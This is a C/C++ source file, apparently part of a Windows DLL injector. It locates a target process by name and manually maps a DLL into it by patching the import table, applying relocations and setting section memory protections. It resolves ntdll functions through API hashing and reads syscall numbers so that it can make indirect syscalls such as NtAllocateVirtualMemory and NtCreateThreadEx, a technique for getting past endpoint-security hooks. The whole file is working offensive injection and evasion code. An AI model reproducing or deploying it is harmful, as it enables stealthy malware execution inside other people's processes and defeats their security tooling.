#include <win32.h>

void ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTILS* atlas_utils, TARGET_DATA* target_data, BOOL freeMem){
    if(lastError){
        printf("%s - %s -> lastError: %d\n", err, msg, lastError);
    }
    else{
        printf("%s - %s -> NTSTATUS: %lx\n", err, msg, status);
    }

    if(freeMem){
        SysPrepare(atlas_utils->atlas_syscalls.NtFreeVirtualMemorySSN, atlas_utils->atlas_syscalls.NtFreeVirtualMemoryAddr);
        if(!NT_SUCCESS(SysInvoke(target_data->hRemote, &target_data->pTargetAddr, &target_data->imageSize, MEM_RELEASE))){
            printf("Error on free NTSTATUS: %lx", status);
        }
    }

    exit(EXIT_FAILURE);
}

DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
    ULONG returnLength = 0;
    DWORD pid = 0;
    NTSTATUS status;

    SysPrepare(atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN, atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr);
    SysInvoke(SystemProcessInformation, NULL, 0, &returnLength);

    PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLength);

    SysPrepare(atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN, atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr);
    status = SysInvoke(SystemProcessInformation, pSpi, returnLength, NULL);
    
    if(!NT_SUCCESS(status)){
        ErrorCallback("PID find failed", 0, status, NULL, NULL, FALSE);
    }

    while(true){
        if(pSpi->ImageName.Length && wcscmp(target, pSpi->ImageName.Buffer) == 0){
            pid = HandleToUlong(pSpi->UniqueProcessId);
            break;
        }

        if(pSpi->NextEntryOffset == 0){
            break;
        }

       pSpi = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSpi + pSpi->NextEntryOffset);
    }

    if(pid == 0){
        ErrorCallback("PID find failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    printf("%s - PID of the target process: %ld\n\n", info, pid);

    return pid;
}

void PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, TARGET_DATA* target_data){
    if(dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size){
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        HANDLE hDll;
        DLL_DATA iat_entry_dll_data;
        SIZE_T procAddr;

        while(pImportDescriptor->Name){
            char * dllName = (char*)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->Name);

            printf("\t%s - Fixing DLL: %s\n", info, dllName);

            if(!C_LoadLibrary(dllName, &hDll, atlas_utils)){
                ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
            }

            RetrieveDLL_DATA((PVOID)hDll, &iat_entry_dll_data);

            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->FirstThunk);
            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->OriginalFirstThunk);

            while(pOriginalFirstThunk->u1.AddressOfData){
                if(IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)){
                    procAddr = C_GetProcAddress(iat_entry_dll_data, NULL, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal));
                    if(procAddr != -1){
                        pIAT->u1.Function = procAddr;
                    }
                    else{
                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
                    }
                }
                else{
                    PIMAGE_IMPORT_BY_NAME pFunction = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pLocalMappingAddr + pOriginalFirstThunk->u1.AddressOfData);
                    procAddr = C_GetProcAddress(iat_entry_dll_data, C_HashString(ConvertCharToWideChar(pFunction->Name)), NULL);
                    if(procAddr != -1){
                        pIAT->u1.Function = procAddr;
                    }
                    else{
                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, target_data, TRUE);
                    }
                }
         
                pOriginalFirstThunk++;
                pIAT++;
            }

            pImportDescriptor++;    
        }
    }
}

void FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_data){
    DWORD_PTR delta = (DWORD_PTR)pTargetAddr - dll_data.preferedAddr;
    
    if(delta != 0){
        PIMAGE_BASE_RELOCATION pRelocRowData = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        PBASE_RELOCATION_ENTRY pRelocationEntries = NULL;
         
        DWORD numTableEntries =   0;
        
        while (pRelocRowData->VirtualAddress){
            numTableEntries = (pRelocRowData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
            pRelocationEntries = (PBASE_RELOCATION_ENTRY)(pRelocRowData + 1); 

            for(size_t i = 0; i < numTableEntries; i++, pRelocationEntries++){
                PDWORD_PTR pEntryValue = (PDWORD_PTR)((LPBYTE)pLocalMappingAddr + (pRelocRowData->VirtualAddress + pRelocationEntries->Offset));

                if(pRelocationEntries->Type == IMAGE_REL_BASED_DIR64){
                    *pEntryValue += delta;
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_HIGHLOW){
                    *pEntryValue += (DWORD)delta;
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_HIGH){
                    *pEntryValue += HIWORD(delta);
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_LOW){
                    *pEntryValue += LOWORD(delta);
                }
            }

            pRelocRowData = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocRowData + pRelocRowData->SizeOfBlock);
        }
    }
}

void FixMemoryProtections(TARGET_DATA* target_data, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils){            
    DWORD sectionHeaderOffset = dll_data.dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    PIMAGE_SECTION_HEADER pSectionHeader = new IMAGE_SECTION_HEADER;

    for(size_t i = 0; i < dll_data.fileHeader->NumberOfSections; i++){        
        DWORD_PTR sectionHeaderAddr = DWORD_PTR((DWORD_PTR)target_data->pTargetAddr + sectionHeaderOffset + i * sizeof(IMAGE_SECTION_HEADER));
  
        ReadProcessMemory(target_data->hRemote, (LPCVOID)sectionHeaderAddr, pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NULL);

        PVOID pSectionAddr = (PVOID)((DWORD_PTR)target_data->pTargetAddr + pSectionHeader->VirtualAddress);
        SIZE_T sectionSize = pSectionHeader->Misc.VirtualSize;
        ULONG protection = 0;
        ULONG oldProtection = 0;

        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE){
            protection = PAGE_WRITECOPY;
        }   
        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ){
            protection = PAGE_READONLY;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ)){
            protection = PAGE_READWRITE;
        }
        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE){
            protection = PAGE_EXECUTE;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_WRITECOPY;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_READ;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) &&(pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_READWRITE;
        }

        SysPrepare(atlas_utils->atlas_syscalls.NtProtectVirtualMemorySSN, atlas_utils->atlas_syscalls.NtProtectVirtualMemoryAddr);
        NTSTATUS status = SysInvoke(target_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);

        if (!NT_SUCCESS(status)) {
            ErrorCallback("Memory protection failed", 0, status, atlas_utils, target_data, TRUE);
        }      
    }
}



PVOID C_GetModuleHandle(DWORD dll){
    wchar_t* wBaseDll;

    C_PPEB_LDR_DATA pLdrData = (C_PPEB_LDR_DATA)((PPEB)PPEB_PTR)->Ldr;
    C_PLDR_DATA_TABLE_ENTRY pLdrEntry = (C_PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;

    while(pLdrEntry->DllBase != NULL){
        wBaseDll = new wchar_t[pLdrEntry->BaseDllName.Length + 1];

        wcsncpy(wBaseDll, pLdrEntry->BaseDllName.Buffer, pLdrEntry->BaseDllName.Length + 1);
        if(C_HashString(wBaseDll) == dll){
            delete [] wBaseDll;
            return pLdrEntry->DllBase;
        }

        pLdrEntry = (C_PLDR_DATA_TABLE_ENTRY)pLdrEntry->InLoadOrderLinks.Flink;
    }

    delete [] wBaseDll;
    return NULL;
}

BOOL C_LoadLibrary(char* dllName, PHANDLE pHDll, ATLAS_UTILS* atlas_utils){
    UNICODE_STRING usDllName;
    if(!ConvertCharToUnicode(dllName, &usDllName)){
        return FALSE;
    } 

    NTSTATUS status = atlas_utils->pLdrLoadDll(NULL, 0, &usDllName, pHDll);
    if(!NT_SUCCESS(status)){
        return FALSE;
    }

    return TRUE;
}

size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal){ 
    PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dll_data.baseAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pFuncNames = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfNames);
    PDWORD pFuncAddrs = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfNameOrdinals);

    for(size_t i = 0; i < pExportTable->NumberOfNames; i++){
        char *funcName = (char*)((DWORD_PTR)dll_data.baseAddr + pFuncNames[i]);
        WORD *funcOrdinal = (WORD*)((DWORD_PTR)dll_data.baseAddr + pOrdinals[i]);
        
        if(ordinal != NULL){
            if(funcOrdinal[i] == ordinal){
                size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);
                return funcAddr;  
            }
        }
        else{
            wchar_t* wfuncName = ConvertCharToWideChar(funcName);
            if(wfuncName != NULL && C_HashString(wfuncName) == targetFuncHash){
                size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);
                return funcAddr; 
            }
        }
    }

    return -1;
}



void RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;

    pDosHeader = (PIMAGE_DOS_HEADER)pDllAddr;

    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
        ErrorCallback("DOS Header signature mismatch", -1, 0, NULL, NULL, FALSE);
    }

    pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDllAddr + pDosHeader->e_lfanew);
    if(pNtHeader->Signature != IMAGE_NT_SIGNATURE){
        ErrorCallback("NT Header signature mismatch", -1, 0, NULL, NULL, FALSE);
    }
    

    dll_data->baseAddr = pDllAddr;
    dll_data->dosHeader = pDosHeader;
    dll_data->ntHeaders = pNtHeader;
    dll_data->fileHeader = &pNtHeader->FileHeader;
    dll_data->optHeader = &pNtHeader->OptionalHeader;

    dll_data->preferedAddr = dll_data->optHeader->ImageBase;
    dll_data->imageSize = dll_data->optHeader->SizeOfImage;
    dll_data->entryPoint = dll_data->optHeader->AddressOfEntryPoint;
}

void RetrieveUtils(ATLAS_UTILS* atlas_utils){
    DLL_DATA dll_data; 

    PVOID pNtpDllAddress = C_GetModuleHandle(Sys_Ntdll);

    if(pNtpDllAddress == NULL){
        ErrorCallback("Retrieve of NTDLL handle failed", GetLastError(), 0, NULL, NULL, FALSE);
    }
    
    RetrieveDLL_DATA(pNtpDllAddress, &dll_data);

    fnLdrLoadDll pLdrLoadDll = (fnLdrLoadDll)C_GetProcAddress(dll_data, Sys_LdrLoadDll, NULL);
    if(pLdrLoadDll == NULL){
        ErrorCallback("Retrieve of aux func 1 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    fnNtWriteVirtualMemory pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)C_GetProcAddress(dll_data, Sys_NtWriteVirtualMemory, NULL);
    if(pNtWriteVirtualMemory == NULL){
        ErrorCallback("Retrieve of aux func 2 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    atlas_utils->atlas_syscalls.NtAllocateVirtualMemorySSN = C_RetrieveSSN(Sys_ZwAllocateVirtualMemory, dll_data);
    atlas_utils->atlas_syscalls.NtProtectVirtualMemorySSN = C_RetrieveSSN(Sys_ZwProtectVirtualMemory, dll_data);
    atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN = C_RetrieveSSN(Sys_ZwQuerySystemInformation, dll_data);
    atlas_utils->atlas_syscalls.NtCreateThreadExSSN = C_RetrieveSSN(Sys_ZwCreateThreadEx, dll_data);
    atlas_utils->atlas_syscalls.NtFreeVirtualMemorySSN = C_RetrieveSSN(Sys_ZwFreeVirtualMemory, dll_data);

    atlas_utils->atlas_syscalls.NtAllocateVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL));
    atlas_utils->atlas_syscalls.NtProtectVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL));
    atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL));
    atlas_utils->atlas_syscalls.NtCreateThreadExAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL));
    atlas_utils->atlas_syscalls.NtFreeVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL));

    atlas_utils->pLdrLoadDll = pLdrLoadDll;
    atlas_utils->pNtWriteVirtualMemory = pNtWriteVirtualMemory; 
}